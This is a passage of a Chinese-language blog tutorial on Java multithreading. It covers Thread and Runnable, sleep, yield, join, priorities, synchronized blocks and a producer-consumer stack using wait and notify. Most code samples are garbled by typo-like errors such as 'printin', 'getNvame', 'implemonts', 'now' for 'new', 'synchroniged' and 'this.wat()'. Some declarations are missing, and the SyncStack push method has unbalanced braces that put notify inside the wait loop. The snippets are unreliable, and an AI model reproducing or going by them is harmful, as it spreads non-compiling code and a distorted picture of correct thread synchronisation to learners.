class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span> A(); <span class="comment">//构造一个A类对象</span></span><br><span class="line">aa.start(); <span class="comment">//调用aa的start方法, start方法会创建一个新的线程，并自动调用aa对象的run()方法</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;BBBBBBBB&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">Thread</span> //创建一个继承<span class="title">Thread</span>的类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//重写Thread中的run方法</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">System.out.printin(<span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意问题"><a href="#注意问题" class="headerlink" title="注意问题"></a>注意问题</h2><ul><li>Thread中<code>start()</code>方法的功能就是创建一个新的线程，<strong>并自动调用该线程的run()方法</strong>，直接调用run()方法是不会创建一个新的线程的</li><li>执行一个线程实际就是执行该线程run方法中的代码</li><li>执行完aa.start();后并不表示aa所对应的线程就一定会立即得到了执行，aa.start();执行完后只是表示aa线程具有了可以立即被CPU执行的资格，但由于想抢占CPU执行的线程很多，CPU并不一定会立即去执行aa所对应的线程</li><li>一个Thread对象能且只能代表一个线程，<strong>一个Thread对象不能调用两次start()方法</strong>，否则会抛出<code>java.lang.lllegalThreadStateException</code>异常</li></ul><p>操作系统控制的标准</p><ol><li><p>优先级</p></li><li><p>时间的长短</p></li><li><p>最长等待时间</p></li><li><p>紧急程度</p></li></ol><h1 id="线程状态的切换"><a href="#线程状态的切换" class="headerlink" title="线程状态的切换"></a>线程状态的切换</h1><p><img src="/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E7%9A%84%E5%88%87%E6%8D%A2.png" alt="创建一个新线程的第二种方法"></p><p>​    执行完 aa.start(); 后并不表示 aa 所对象的线程就一定会立即得到了执行，aa.start(); 执行完后只是表示 t 线程具有了可以立即被CPU执行的资格，但由于想抢占CPU执行的线程很多，CPU并不一定会立即去执行t所对应的线程</p><h1 id="创建一个新线程的第二种方法"><a href="#创建一个新线程的第二种方法" class="headerlink" title="创建一个新线程的第二种方法"></a>创建一个新线程的第二种方法</h1><ol><li><p>定义一个实现了<code>Runnable</code>接口的类，假定为A</p></li><li><p>创建A类对象aa,代码如下<br>   <code>A aa = new A</code></p></li><li><p>利用aa构造一个<code>Thread</code>对象tt,<br>  <code>Thread tt = new Thread(aa);</code></p></li><li><p>调用tt中的start方法</p><p>  <code>tt.start();</code></p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;AAAA\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">aa = <span class="keyword">new</span> A():</span><br><span class="line"><span class="comment">//aa.start(); //error</span></span><br><span class="line">        Thread t = <span class="keyword">new</span> Thread(aa);</span><br><span class="line">        t.start();</span><br><span class="line">        </span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;BBBB\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程常用方法的介绍"><a href="#线程常用方法的介绍" class="headerlink" title="线程常用方法的介绍"></a>线程常用方法的介绍</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span>  </span></span><br><span class="line"><span class="function">    设置当前线程的名字</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Thread <span class="title">currentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    返回对当前正在执行的线程对象的引用。</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    返回当前线程的名字</span></span><br></pre></td></tr></table></figure><p><strong>线程之间的执行顺序是不确定的</strong></p><h1 id="线程的控制"><a href="#线程的控制" class="headerlink" title="线程的控制"></a>线程的控制</h1><h2 id="线程控制的基本方法"><a href="#线程控制的基本方法" class="headerlink" title="线程控制的基本方法"></a>线程控制的基本方法</h2><table><thead><tr><th>方法</th><th align="left">功能</th></tr></thead><tbody><tr><td>isAlive()</td><td align="left">判断线程是否还”活“着，即线程是否还未终止。</td></tr><tr><td>getPriority()</td><td align="left">获得线程的优先级数值</td></tr><tr><td>setPriority()</td><td align="left">设置线程的优先级数值</td></tr><tr><td>Thread.sleep()</td><td align="left">将当前线程睡眠指定毫秒数</td></tr><tr><td>join()</td><td align="left">调用某线程的该方法,将当前线程与该线程”合并”，即等待该线程结束,再恢复当前线程的运行。</td></tr><tr><td>yield()</td><td align="left">让出CPU，当前线程进入就绪队列等待调度。</td></tr><tr><td>wait()</td><td align="left">当前线程进入对象的wait pool。</td></tr><tr><td>notify() <br>notifyAll()</td><td align="left">唤醒对象的wait poo1中的一个<br>所有等待线程。</td></tr></tbody></table><p><strong><code>sleep()</code>是堵塞，<code>yield()</code>是就绪</strong></p><h1 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h1><ul><li>线程的优先级用数字来表示，范围从1到10，数值越高等级越高</li><li>主线程的缺省优先级是5，子线程的优先级默认与其父线程相同</li><li>Java提供一个线程调度器来监控程序中启动后进入就绪状态的所有线程线程调度器按照线程的优先级决定应调度哪个线程来执行。</li><li>线程的优先级用数字表示，范围从1到10，一个线程的缺省优先级是5。◇<br>◇<code>Thread.MIN_PRIORITY=1</code><br>◇<code>Thread.MAX_PRIORITY=10</code><br>◇<code>Thread.NORM_PRIORITY=5</code></li><li>使用下述线方法获得或设置线程对象的优先级。<br>◇<code>int getPriority();</code><br>◇<code>void setPriority(int newPriority);</code></li><li>通常高优先级的线程将先于优先级低的线程执行，但并不总是这样，因此<strong>实际开发中并不单纯依赖优先级来决定线程运行次序</strong></li><li>相等交替执行（内部有时间片轮转）</li></ul><h1 id="线程的休眠"><a href="#线程的休眠" class="headerlink" title="线程的休眠"></a>线程的休眠</h1><ul><li><p>线程休眠——暂停执行当前运行中的线程，使之进入阻塞状态，待经过指定的“延迟时间”后再醒来并转入到就绪状态。</p></li><li><p><code>Thread</code>类提供的相关方法:<br> public static void sleep(long millis)<br> public static void sleep(long millis, int nanos)</p></li><li><p>由于是静态方法，可以由Thread直接调用</p></li><li><p><strong>sleep()方法会抛出<code>InterruptedException</code>异常，我们必须得对其进行捕捉</strong></p><p>示例</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSleep</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A aa = <span class="keyword">new</span> A();</span><br><span class="line">Thread tt = <span class="keyword">new</span> Thread(aa);</span><br><span class="line">        tt.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//9行</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getNvame() + <span class="string">&quot; &quot;</span>+ i);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>); </span><br><span class="line">                <span class="comment">//这里的Thread.sleep(1000)会抛出异常必须的进行捕捉，不能在9的后面添加throws Exception</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常"><a href="#无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常" class="headerlink" title="无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常"></a>无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常</h1><p><code>**Runnable</code>（父类）没有抛异常，所以A（子类）不能抛异常**</p><p><strong>run方法处理异常要写tey，不能抛出</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//throws Exception //注释符不能去掉，否则编译会报错</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//throws Exception //注释符不能去掉，否则编译会报错</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>原因:</strong><br>    <strong>重写方法抛出异常的范围不能大于被重写法排除的异常范围</strong></p><h1 id="线程的让步"><a href="#线程的让步" class="headerlink" title="线程的让步"></a>线程的让步</h1><ul><li>让出CPU，给其他线程执行的机会</li><li>让运行中的线程主动放弃当前获得的CPU处理机会，但不是使该线程阻塞,而是使之转入就绪状态。<br>  <code>public static void yield()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJoin</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        MyRunner r = <span class="keyword">new</span> MyRunner();</span><br><span class="line">        Thread t = <span class="keyword">new</span> Thread(r);</span><br><span class="line">        t.start();</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">        t.join(); <span class="comment">//7行</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InterruptedException)</span><br><span class="line">        &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主线程:&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRunner</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=O;i&lt;<span class="number">50</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;子线程:&quot;</span> +i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    7行的t.join();暂停当前正在执行t.join();的线程,直到t所对应的线程运行终止之后,当前线程才会获得继续执行的机会</p><p><strong>注意: t.join()不是暂停t对象所对应的线程</strong></p><h1 id="线程的同步"><a href="#线程的同步" class="headerlink" title="线程的同步"></a>线程的同步</h1><h2 id="买票程序"><a href="#买票程序" class="headerlink" title="买票程序"></a>买票程序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="title">implemonts</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> tickets = <span class="number">100</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (ticket s &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;%s线程正在卖出第%d张票\n&quot;</span>,Thread.currentThread().getName(),tickets);</span><br><span class="line">    --tickets;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTickets</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">aal = <span class="function">now <span class="title">A</span><span class="params">()</span></span>;</span><br><span class="line">Thread t1 = <span class="keyword">new</span> Thread (aa1);</span><br><span class="line">        t1.start();</span><br><span class="line">        </span><br><span class="line">A aa2 = <span class="keyword">new</span> A();</span><br><span class="line">Thread t2= <span class="function">now <span class="title">Thread</span><span class="params">(aa2)</span></span>;</span><br><span class="line">        t2.start();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//正确</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        aa = now A();</span></span><br><span class="line"><span class="comment">        Thread t1= now Thread(aa);</span></span><br><span class="line"><span class="comment">        t1.start();</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        Thread t2= now Thread(aa);</span></span><br><span class="line"><span class="comment">        t2.start();</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这不是两个线程买100张，是两个程序个卖个的</p><p>出现同一张票卖多次原因</p><p>1.处理相同资源</p><p>2.关键步骤不是互斥的</p><h2 id="Synchronized关键字"><a href="#Synchronized关键字" class="headerlink" title="Synchronized关键字"></a>Synchronized关键字</h2><ul><li><strong>synchronized可以用来修饰</strong><ul><li><strong>一个方法</strong></li><li><strong>一个方法内部的某个代码块</strong></li></ul></li></ul><h4 id="修饰代码块"><a href="#修饰代码块" class="headerlink" title="修饰代码块"></a>修饰代码块</h4><p>格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svnchronized(类对象名aa) <span class="comment">//1行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//同步代码块 //3行</span></span><br><span class="line">&#125;<span class="comment">//4行</span></span><br></pre></td></tr></table></figure><p>功能：</p><ul><li>synchronized(类对象名aa)的含义是:判断aa是否已经被其他线程霸占，如果发现已经被其他线程霸占，则当前线程陷入等待中，如果发现aa没有被其他线程霸占，则当前线程霸占在aa对象，并执行3行的同步代码块，在当前线程执行3行代码时，其他线程将无法再执行3行的代码(因为当前线程己经霸占了aa对象)当前线程执行完3行的代码后，会自动释放对aa对象的霸占，此时其他线程会相互竞争对aa的霸占，最终CPU会选择其中的某一个线程执行</li><li>最终导致的结果是<strong>：一个线程正在操作某资源的时候,将不允许其它线程操作该资源，即一次只允许一个线程处理该资源</strong></li></ul><p>释放后在一起竞争资源</p><h4 id="修饰方法"><a href="#修饰方法" class="headerlink" title="修饰方法"></a>修饰方法</h4><ul><li>Synchronized修饰一个方法时，实际霸占的是<strong>该方法的this指针所指向的对象</strong></li><li>即Synchronized修饰一个方法时，实际霸占的<strong>正在调用该方法的对象</strong></li><li>附注:<br> 霸占的专业术语叫锁定，霸占住的那个对象专业术语叫做监听器</li></ul><h2 id="生产消费"><a href="#生产消费" class="headerlink" title="生产消费"></a>生产消费</h2><h3 id="同步概念"><a href="#同步概念" class="headerlink" title="同步概念"></a>同步概念</h3><p>​    通常，一些同时运行的线程需要共享数据。在这种时候，每个线程就必须要考虑与其他一起共享数据的线程的状态与行为，否则的话就不能保证共享数据的一致性，从而也就不能保证程序的正确性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>[] data = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">6</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> boid <span class="title">push</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        data[index] = c;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        index--;</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    当有两个线程A和B同时使用了Stack类的一个对象时现在我要求：0先把r存入Stack中，再将r取出来<br>​    下面的步骤详细演示了AB线程不同步所带来的问题</p><p><img src="/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E4%B8%8D%E5%90%8C%E6%AD%A5%E6%BC%94%E7%A4%BA.png"></p><p>最终结果是：’r’ 没有被存入，取出的是 ‘C’ 而不是 ‘r’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SyncStack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">pnivate <span class="keyword">int</span> index =<span class="number">0</span>;</span><br><span class="line">pnvate <span class="keyword">char</span>[] data = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">6</span>];</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(index == datalength)</span><br><span class="line">        &#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">    <span class="keyword">this</span>.wait(); <span class="comment">//7行</span></span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">catch</span>(InterruptedException e)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">this</span>.notify() <span class="comment">//10行</span></span><br><span class="line">        data[index] = c;</span><br><span class="line">    index++;</span><br><span class="line">    System.out.println(<span class="string">&quot;produced: &quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> synchroniged <span class="keyword">char</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(inde == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">this</span>.wat();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(InterruptedException e)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.notify(); <span class="comment">//20行</span></span><br><span class="line">        index--;</span><br><span class="line">        System.out.println(<span class="string">&quot;消费:&quot;</span> + data[index]);</span><br><span class="line">        <span class="keyword">return</span> data[index]; <span class="comment">//23行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    假设现在有两个线程P(生产)和C(消费)P生产己满，执行7行代码陷入阻塞状态，同时释放P线程对this的锁定，这时候C线程会得到this对象的标志位开始运行。</p><p>​    另外C线程执行完20行代码后，程序并不会立即转到P线程开始运行，因为C执行notify,只是叫醒P,让P从因为wait this对象而陷入阻塞的状态进入就绪状态,记住：一个线程notify，该线程并不会释放对this的锁定，只有C执行完23行的代码后，C才会释放对this的锁定，这时候C和P会同时争夺对this的锁定，具体执行哪个由系统调度器决定</p><p>要是<code>this.wait();</code>没有陷入堵塞，<code>this.notify();</code>就不起效果。</p><h3 id="注意问题-1"><a href="#注意问题-1" class="headerlink" title="注意问题"></a>注意问题</h3><ul><li><p>执行完20行的代码后，程序绝对不会立即切换到另一个线程</p></li><li><p>20行代码叫醒的是其他线程，叫醒的不是本线程</p></li><li><p>在最开始，P和C刚开始执行时：<br>即便P没有wait，也可以在C中notify,  即便c没有wait，也可以在P中notify</p></li></ul><h1 id="notify-和-wait-方法"><a href="#notify-和-wait-方法" class="headerlink" title="notify 和 wait 方法"></a>notify 和 wait 方法</h1><h2 id="this-notify"><a href="#this-notify" class="headerlink" title="this.notify()"></a>this.notify()</h2><p><strong>功能:</strong></p><ul><li>不是叫醒正在执行this.notify();的当前线程</li><li>而是叫醒一个现在<code>正在wait this对象</code>的其他线程，如果有多个线程正在wait this对象，</li><li>通常是叫醒<code>最先wait this对象</code>的线程,但具体是叫醒哪一个，</li><li>这是由系统调度器控制,程序员无法控制</li></ul><p>例子：</p><ul><li>假设现在有T1、T2、T3、T4四个线程我们在T4线程中执行了aa.notify()语句</li><li>则即便此时T1T2 T3没有一个线程因为wait aa对象而陷入阻塞状态，T4线程中执行aa.notify方法时也不会有任何错误</li><li>执行aa.notify方法时如果一个线程都没有叫醒，这是可以的</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="aa-wait"><a href="#aa-wait" class="headerlink" title="aa.wait()"></a>aa.wait()</h4><ul><li>将执行aa.wait()的当前线程转入阻塞状态，让出CPU的控制权</li><li>释放对aa的锁定</li></ul><h4 